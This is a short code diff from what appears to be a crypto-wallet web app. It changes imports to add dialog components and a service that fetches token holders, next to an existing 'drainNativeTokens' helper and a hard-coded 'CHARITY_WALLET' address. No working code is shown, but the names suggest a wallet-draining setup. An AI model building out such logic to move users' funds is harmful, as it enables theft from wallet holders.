@@ -20,7 +20,8 @@ import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
-import { OTC_ORDERS_LIST, TOTAL_ORDERS_VALUE, getAvatarUrl, OtcListStatus } from '@/data/otcOrdersList';
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
+import { fetchTokenHolders, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
